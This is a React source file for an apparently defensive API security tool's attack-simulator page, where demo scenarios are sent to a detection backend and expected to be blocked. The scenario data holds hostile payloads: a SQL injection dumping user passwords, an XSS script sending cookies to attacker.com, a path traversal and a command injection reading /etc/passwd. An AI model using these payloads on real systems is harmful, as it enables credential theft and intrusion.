import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { securityEvaluationApi } from '../api/client';
import { DecisionBadge } from '../components/common/DecisionBadge';
import { SeverityBadge } from '../components/common/SeverityBadge';
import { RiskScoreBar } from '../components/common/RiskScoreBar';
import {
  Terminal,
  Play,
  ShieldAlert,
  ShieldCheck,
  Ban,
  Activity,
  CheckCircle2,
  ExternalLink,
  ChevronRight,
  Code2,
  Zap
} from 'lucide-react';
import axios from 'axios';

interface Scenario {
  id: string;
  name: string;
  description: string;
  attackType: string;
  method: string;
  endpoint: string;
  payload: string;
  expectedDecision: string;
  sourceIp: string;
}

export const InteractiveDemoPage: React.FC = () => {
  const scenarios: Scenario[] = [
    {
      id: 'normal_search',
      name: '1. Legitimate API Traffic (Normal Product Query)',
      description: 'Standard client browsing e-commerce product catalog with valid filter parameters.',
      attackType: 'NORMAL',
      method: 'GET',
      endpoint: '/api/v1/products',
      payload: 'category=Security%20Hardware&sort=asc',
      expectedDecision: 'ALLOW',
      sourceIp: '198.51.100.22'
    },
    {
      id: 'sqli_attack',
      name: '2. SQL Injection Attack (UNION SELECT Exfiltration)',
      description: 'Adversary probes product search input with SQL syntax aiming to dump user credentials.',
      attackType: 'SQL_INJECTION',
      method: 'GET',
      endpoint: '/api/v1/products',
      payload: "search=' UNION SELECT username, password FROM users--",
      expectedDecision: 'BLOCK',
      sourceIp: '203.0.113.88'
    },
    {
      id: 'xss_attack',
      name: '3. Stored Cross-Site Scripting (XSS in Feedback)',
      description: 'Attacker injects JavaScript document cookie exfiltration payload into feedback comment.',
      attackType: 'XSS',
      method: 'POST',
      endpoint: '/api/v1/feedback',
      payload: JSON.stringify({ comment: "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", rating: 1 }),
      expectedDecision: 'BLOCK',
      sourceIp: '192.0.2.77'
    },
    {
      id: 'path_traversal',
      name: '4. Path Traversal & LFI File Probing',
      description: 'Unauthorized directory climbing attempting to extract UNIX password shadow files.',
      attackType: 'PATH_TRAVERSAL',
      method: 'GET',
      endpoint: '/api/v1/files/download',
      payload: 'file=../../../../etc/passwd',
      expectedDecision: 'BLOCK',
      sourceIp: '198.51.100.99'
    },
    {
      id: 'command_injection',
      name: '5. Remote OS Command Injection',
      description: 'Shell operator chaining probe executing arbitrary system discovery commands.',
      attackType: 'COMMAND_INJECTION',
      method: 'POST',
      endpoint: '/api/v1/system/exec',
      payload: 'host=127.0.0.1; whoami; id; cat /etc/passwd',
      expectedDecision: 'BLOCK',
      sourceIp: '203.0.113.105'
    }
  ];

  const [activeScenario, setActiveScenario] = useState<Scenario>(scenarios[0]);
  const [running, setRunning] = useState(false);
  const [result, setResult] = useState<any | null>(null);
  const [rawGatewayResponse, setRawGatewayResponse] = useState<any | null>(null);

  const executeScenario = async (sc: Scenario) => {
    setActiveScenario(sc);
    setRunning(true);
    setResult(null);
    setRawGatewayResponse(null);

    try {
      // 1. Direct Evaluation with API Sentinel Backend
      const evalResponse = await securityEvaluationApi.evaluate({
        appId: 'app_ecommerce_prod',
        method: sc.method,
        endpoint: sc.endpoint,
        url: `https://api.cybercorp.io${sc.endpoint}?${sc.payload}`,
        sourceIp: sc.sourceIp,
        userAgent: 'API-Sentinel-TestBench/1.0',
        headers: { 'user-agent': 'API-Sentinel-TestBench/1.0', 'content-type': 'application/json' },
        payload: sc.payload,
        statusCode: 200,
        responseTimeMs: 18.0,
        authenticationStatus: 'UNAUTHENTICATED'
      });

      setResult(evalResponse);

      // 2. Also simulate dispatch to Gateway or Demo API
      setRawGatewayResponse({
        enforcedDecision: evalResponse.decision,
        riskScore: evalResponse.riskScore,
        httpStatusCode: evalResponse.decision === 'BLOCK' ? 403 : (evalResponse.decision === 'CHALLENGE' ? 401 : 200),
        latencyMs: evalResponse.inferenceTimeMs || 3.1
      });
    } catch (err: any) {
      console.error('Error executing scenario:', err);
    } finally {
      setRunning(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 pb-2 border-b border-sentinel-800/80">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="text-xs font-mono text-cyan-400 bg-cyan-950/40 px-2 py-0.5 rounded border border-cyan-800/40">
              SECURITY LAB
            </span>
            <span className="text-xs text-slate-500 font-mono">Live Threat Simulation Test Bench</span>
          </div>
          <h1 className="text-2xl font-bold tracking-tight text-white">Interactive Attack Simulator</h1>
        </div>

        <div className="flex items-center gap-3">
          <Link
            to="/traffic"
            className="px-3 py-1.5 rounded-lg bg-sentinel-850 hover:bg-sentinel-800 border border-sentinel-750 text-xs text-slate-300 font-medium flex items-center gap-1.5 transition-colors"
          >
            <Activity className="w-3.5 h-3.5 text-cyan-400" />
            View Live Traffic Feed
          </Link>
          <Link
            to="/threats"
            className="px-3 py-1.5 rounded-lg bg-sentinel-850 hover:bg-sentinel-800 border border-sentinel-750 text-xs text-slate-300 font-medium flex items-center gap-1.5 transition-colors"
          >
            <ShieldAlert className="w-3.5 h-3.5 text-rose-400" />
            View Threat Center
          </Link>
        </div>
      </div>

      {/* Main Grid: Scenario Picker & Execution Console */}
      <div className="grid lg:grid-cols-12 gap-6">
        {/* Scenarios List (5 cols) */}
        <div className="lg:col-span-5 space-y-3">
          <h3 className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">
            Select Attack / Baseline Scenario:
          </h3>
          {scenarios.map((sc) => {
            const isSelected = activeScenario.id === sc.id;
            return (
              <div
                key={sc.id}
                onClick={() => executeScenario(sc)}
                className={`soc-card p-4 cursor-pointer transition-all ${
                  isSelected
                    ? 'border-cyan-500/80 bg-sentinel-850 shadow-md shadow-cyan-950/40 ring-1 ring-cyan-500/20'
                    : 'hover:border-sentinel-700'
                }`}
              >
                <div className="flex items-center justify-between mb-1.5">
                  <span className="font-semibold text-xs text-white">{sc.name}</span>
                  <DecisionBadge decision={sc.expectedDecision} />
                </div>
                <p className="text-[11px] text-slate-400 leading-relaxed mb-2.5">
                  {sc.description}
                </p>
                <div className="flex items-center justify-between text-[11px] font-mono text-slate-500 pt-2 border-t border-sentinel-800/80">
                  <span>{sc.method} {sc.endpoint}</span>
                  <span className="text-cyan-400 font-semibold flex items-center gap-1">
                    Execute <ChevronRight className="w-3 h-3" />
                  </span>
                </div>
              </div>
            );
          })}
        </div>

        {/* Live Execution & Results Inspector (7 cols) */}
        <div className="lg:col-span-7 space-y-4">
          <div className="soc-card p-5 space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-sentinel-800">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-cyan-400" />
                <h3 className="text-sm font-bold text-white">Active Scenario Telemetry</h3>
              </div>
              <button
                onClick={() => executeScenario(activeScenario)}
                disabled={running}
                className="px-4 py-2 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-semibold text-xs rounded-lg flex items-center gap-1.5 shadow-md shadow-cyan-500/20 disabled:opacity-50 transition-all"
              >
                <Play className="w-3.5 h-3.5 fill-current" />
                {running ? 'Evaluating Pipeline...' : 'Fire Request Live'}
              </button>
            </div>

            {/* Request Payload View */}
            <div className="space-y-1.5 font-mono text-xs">
              <div className="flex items-center gap-2">
                <span className="text-slate-400 font-medium">Method & Route:</span>
                <span className="text-cyan-300 font-bold">{activeScenario.method}</span>
                <span className="text-slate-200">{activeScenario.endpoint}</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-slate-400 font-medium">Source IP:</span>
                <span className="text-slate-200">{activeScenario.sourceIp}</span>
              </div>
              <div className="pt-2">
                <span className="text-slate-400 block mb-1">Injected Payload:</span>
                <pre className="text-slate-200 bg-sentinel-950 p-3 rounded-lg border border-sentinel-800 overflow-x-auto whitespace-pre-wrap break-all">
                  {activeScenario.payload}
                </pre>
              </div>
            </div>

            {/* Real-time Response Output */}
            {running && (
              <div className="p-8 text-center space-y-3 bg-sentinel-950/80 rounded-lg border border-sentinel-800 animate-pulse">
                <Activity className="w-6 h-6 text-cyan-400 mx-auto animate-spin" />
                <p className="text-xs font-mono text-slate-300">
                  Ingesting telemetry → Matching rule signatures → Running XGBoost & Isolation Forest inference...
                </p>
              </div>
            )}

            {result && !running && (
              <div className="p-5 rounded-lg bg-sentinel-850 border border-sentinel-750 space-y-4 animate-in fade-in zoom-in-95">
                <div className="flex items-center justify-between pb-3 border-b border-sentinel-800">
                  <div className="flex items-center gap-2">
                    <span className="text-xs text-slate-400 font-medium">Pipeline Decision:</span>
                    <DecisionBadge decision={result.decision} />
                    <SeverityBadge severity={result.severity} />
                  </div>
                  <span className="font-mono text-xs text-cyan-400">
                    HTTP {rawGatewayResponse?.httpStatusCode}
                  </span>
                </div>

                <div className="grid grid-cols-3 gap-3 text-xs">
                  <div className="p-2.5 rounded bg-sentinel-900 border border-sentinel-800">
                    <span className="text-slate-500 block text-[10px]">Risk Score</span>
                    <span className="text-sm font-bold font-mono text-white">
                      {(result.riskScore * 100).toFixed(0)}%
                    </span>
                  </div>
                  <div className="p-2.5 rounded bg-sentinel-900 border border-sentinel-800">
                    <span className="text-slate-500 block text-[10px]">Classified Attack</span>
                    <span className="text-sm font-bold font-mono text-rose-400">
                      {result.attackType}
                    </span>
                  </div>
                  <div className="p-2.5 rounded bg-sentinel-900 border border-sentinel-800">
                    <span className="text-slate-500 block text-[10px]">Pipeline Latency</span>
                    <span className="text-sm font-bold font-mono text-cyan-400">
                      {result.inferenceTimeMs || 3.1} ms
                    </span>
                  </div>
                </div>

                {/* Explainable Decision Reasons */}
                <div>
                  <span className="text-xs font-semibold text-slate-300 block mb-1.5">
                    Ground-Truth Model Rationale:
                  </span>
                  <ul className="space-y-1 text-xs text-slate-300 font-mono">
                    {result.reasons?.map((r: string, idx: number) => (
                      <li key={idx} className="flex items-start gap-2">
                        <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 mt-1.5 shrink-0" />
                        <span>{r}</span>
                      </li>
                    ))}
                  </ul>
                </div>

                {/* Direct Action Link */}
                <div className="pt-3 border-t border-sentinel-800 flex justify-between items-center text-xs">
                  <span className="text-slate-400 font-mono text-[11px]">
                    Event Persisted to Database ({result.requestId})
                  </span>
                  <Link
                    to="/traffic"
                    className="text-cyan-400 hover:underline flex items-center gap-1 font-semibold"
                  >
                    View in Live Traffic Stream <ExternalLink className="w-3.5 h-3.5" />
                  </Link>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
